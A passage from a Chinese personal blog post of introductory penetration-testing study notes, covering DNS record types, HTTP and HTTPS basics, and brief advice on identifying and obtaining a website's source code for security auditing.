+<li>功能：邮件系统通过MX记录确定发送邮件时的目标邮件服务器，支持多个邮件服务器并可设置优先级，优先级低的服务器优先接收邮件。</li>
+<li>例子：域名<code>example.com</code>的MX记录指向<code>mail.example.com</code>，邮件发送时会根据MX记录路由到该服务器。</li>
+<li>作用：确保电子邮件能正确投递到指定的邮件服务器。</li>
+</ul>
+<ol start="3">
+<li>CNAME记录（Canonical Name Record，别名记录）</li>
+</ol>
+<ul>
+<li>用途：将一个域名作为别名指向另一个域名。</li>
+<li>功能：允许多个域名指向同一个主机名，简化管理和维护。例如，<code>www.example.com</code>和<code>mail.example.com</code>都可以指向<code>host.example.com</code>，只需维护<code>host.example.com</code>的A记录。</li>
+<li>作用：方便域名重定向和多服务指向同一服务器，灵活管理DNS记录。</li>
+<li>工作流程：DNS查询时，先返回CNAME指向的真实域名，再对该真实域名进行解析。</li>
+</ul>
+<ol start="4">
+<li>NS记录（Name Server Record）</li>
+</ol>
+<ul>
+<li>用途：指定负责该域名解析的权威DNS服务器。</li>
+<li>功能：告诉DNS解析器应该向哪些服务器请求该域名的DNS记录，是域名解析的起点和关键。</li>
+<li>作用：保证域名解析的可靠性和高可用性，通常一个域名会有多个NS记录用于负载均衡和故障转移。</li>
+<li>与SOA记录区别：NS记录指向解析服务器，SOA记录包含区域管理信息，如主服务器、管理员邮箱、刷新时间等</li>
+</ul>
+</blockquote>
+<h4 id="http-https"><a href="#http-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h4><h5 id="http"><a href="#http" class="headerlink" title="http"></a>http</h5><ul>
+<li><strong>HTTP协议是什么？</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP协议是超文本传输协议的缩写，英文是Hyper Text Transfer Protocol。它是从WEB服务器传输超文本标记语言(HTML)到本地浏览器的传送协议。</span><br><span class="line">设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。</span><br><span class="line">HTTP有多个版本，目前广泛使用的是HTTP/1.1版本。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>HTTP原理</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP是一个基于TCP/IP通信协议来传递数据的协议，传输的数据类型为HTML 文件,、图片文件, 查询结果等。</span><br><span class="line"></span><br><span class="line">HTTP协议一般用于B/S架构（）。浏览器作为HTTP客户端通过URL向HTTP服务端即WEB服务器发送所有请求。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>HTTP特点</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http协议支持客户端/服务端模式，也是一种请求/响应模式的协议。</span><br><span class="line">简单快速：客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。</span><br><span class="line">灵活：HTTP允许传输任意类型的数据对象。传输的类型由Content-Type加以标记。</span><br><span class="line">无连接：限制每次连接只处理一个请求。服务器处理完请求，并收到客户的应答后，即断开连接，但是却不利于客户端与服务器保持会话连接，为了弥补这种不足，产生了两项记录http状态的技术，一个叫做Cookie,一个叫做Session。</span><br><span class="line">无状态：无状态是指协议对于事务处理没有记忆，后续处理需要前面的信息，则必须重传。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>URI和URL的区别</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。</span><br><span class="line"></span><br><span class="line">URI：Uniform Resource Identifier 统一资源标识符</span><br><span class="line">URL：Uniform Resource Location 统一资源定位符</span><br><span class="line">URI 是用来标示 一个具体的资源的，我们可以通过 URI 知道一个资源是什么。</span><br><span class="line"></span><br><span class="line">URL 则是用来定位具体的资源的，标示了一个具体的资源位置。互联网上的每个文件都有一个唯一的URL。</span><br></pre></td></tr></table></figure>
+
+<p>常见请求方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:请求指定的页面信息，并返回实体主体。</span><br><span class="line">POST:向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</span><br><span class="line">HEAD:类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头</span><br><span class="line">PUT:从客户端向服务器传送的数据取代指定的文档的内容。</span><br><span class="line">DELETE:请求服务器删除指定的页面。</span><br></pre></td></tr></table></figure>
+
+<h5 id="https"><a href="#https" class="headerlink" title="https"></a>https</h5><p>HTTPS 协议（HyperText Transfer Protocol over Secure Socket Layer）：一般理解为HTTP+SSL&#x2F;TLS，通过 SSL证书来验证服务器的身份，并为浏览器和服务器之间的通信进行加密。</p>
+<p>什么是SSL？</p>
+<p>SSL（Secure Socket Layer，安全套接字层）：1994年为 Netscape 所研发，SSL 协议位于 TCP&#x2F;IP 协议与各种应用层协议之间，为数据通讯提供安全支持。</p>
+<p>TLS（Transport Layer Security，传输层安全）：其前身是 SSL，它最初的几个版本（SSL 1.0、SSL 2.0、SSL 3.0）由网景公司开发，1999年从 3.1 开始被 IETF 标准化并改名，发展至今已经有 TLS 1.0、TLS 1.1、TLS 1.2 三个版本。SSL3.0和TLS1.0由于存在安全漏洞，已经很少被使用到。TLS 1.3 改动会比较大，目前还在草案阶段，目前使用最广泛的是TLS 1.1、TLS 1.2。</p>
+<p><strong>浏览器在使用HTTPS传输数据的流程是什么？</strong></p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202506110828674.png" alt="image-20250611082818584" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">首先客户端通过URL访问服务器建立SSL连接。</span><br><span class="line">服务端收到客户端请求后，会将网站支持的证书信息（证书中包含公钥）传送一份给客户端。</span><br><span class="line">客户端的服务器开始协商SSL连接的安全等级，也就是信息加密的等级。</span><br><span class="line">客户端的浏览器根据双方同意的安全等级，建立会话密钥，然后利用网站的公钥将会话密钥加密，并传送给网站。</span><br><span class="line">服务器利用自己的私钥解密出会话密钥。</span><br><span class="line">服务器利用会话密钥加密与客户端之间的通信。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="web源码扩展"><a href="#web源码扩展" class="headerlink" title="web源码扩展"></a>web源码扩展</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#数据库配置文件，后台目录，模版目录，数据库目录等</span><br><span class="line"></span><br><span class="line">#ASP,PHP,ASPX,JSP,JAVAWEB等脚本类型源码安全问题</span><br><span class="line"></span><br><span class="line">#社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</span><br><span class="line"></span><br><span class="line">#开源，未开源问题，框架非框架问题，关于CMS识别问题及后续等</span><br><span class="line"></span><br><span class="line">#关于源码获取的相关途径:搜索，咸鱼淘宝，第三方源码站，各种行业对应</span><br><span class="line"></span><br><span class="line">#总结:</span><br><span class="line"></span><br><span class="line">关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak文件等），未获取到的源码采用各种方法想办法获取!</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以先查看网站的框架在网上能不能下载到，然后直接找漏洞</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>kinsey</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://kinsey973.github.io/2025/06/10/%E6%B8%97%E9%80%8F/" title="渗透">https://kinsey973.github.io/2025/06/10/%E6%B8%97%E9%80%8F/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2025/06/24/ctfshow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="ctfshow-文件上传"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ctfshow-文件上传</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/05/21/SUCTF-2019-Upload-Labs-2/" rel="next" title="[SUCTF 2019]Upload Labs 2"><span class="post-nav-text">[SUCTF 2019]Upload Labs 2</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>如果您有任何关于博客内容的相关讨论，欢迎前往 <a href="https://github.com/kinsey973/kinsey973.github.io/discussions" target="_blank">GitHub Discussions</a> 与我交流。</span><br></div><div id="waline"></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"><script>window.CONFIG.waline.config.path = "/2025/06/10/%E6%B8%97%E9%80%8F/"</script><div class="js-Pjax"><script src="/js/comments/waline.js" type="module" defer></script></div></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">苏ICP备17038157号</a></div><div class="copyright"><span>&copy; 2023 – 2025 </span><a class="with-love" id="animate" target="_blank" rel="noopener" href="https://github.com/kinsey973" title="Github"><span class="icon iconify" data-icon="ri:github-line"></span></a><span class="author"> kinsey</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v7.2.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="footer-custom-text"><a href="https://www.travellings.cn/go.html" target="_blank" rel="noopener" title="开往-友链接力"><img src="https://www.travellings.cn/assets/logo.gif" alt="开往-友链接力" width="120"></a></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script defer src="https://fastly.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script><script defer src="https://fastly.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script><script defer src="/js/search/algolia-search.js" type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"></div><div class="algolia-results"><div id="algolia-stats"></div><div id="algolia-hits"></div><div class="algolia-pagination" id="algolia-pagination"></div></div></div><script>function initMourn() {
+  const date = new Date();
+  const today = (date.getMonth() + 1) + "-" + date.getDate()
+  const mourn_days = ["4-4","9-18"]
+  if (mourn_days.includes(today)) {
+    document.documentElement.style.filter = "grayscale(1)";
+  }
+}
+initMourn();</script></body></html>
